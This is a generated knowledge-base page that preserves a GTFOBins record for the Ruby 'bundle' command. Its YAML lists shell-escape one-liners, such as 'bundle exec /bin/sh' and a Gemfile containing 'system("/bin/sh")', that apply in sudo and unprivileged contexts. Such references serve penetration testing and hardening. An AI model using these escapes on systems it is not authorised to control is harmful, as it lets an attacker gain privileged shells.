---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# bundle

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `bundle` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/bundle` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [bundle](../../tools/linux/bundle.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | bundle |
| name | bundle |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/bundle/ |

## Preserved Source Material

```yaml
_body: ''
_name: bundle
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/bundle
functions:
  inherit:
  - code: bundle help
    contexts:
      sudo: null
      unprivileged: null
    from: less
  - code: 'touch Gemfile

      bundle console'
    contexts:
      sudo: null
      unprivileged: null
    from: irb
  shell:
  - code: BUNDLE_GEMFILE=x bundle exec /bin/sh
    contexts:
      sudo: null
      unprivileged: null
  - code: 'touch Gemfile

      bundle exec /bin/sh'
    contexts:
      sudo: null
      unprivileged: null
  - code: 'echo ''system("/bin/sh")'' >Gemfile

      bundle install'
    comment: This might run the shell twice, one after the other.
    contexts:
      sudo: null
      unprivileged: null
```
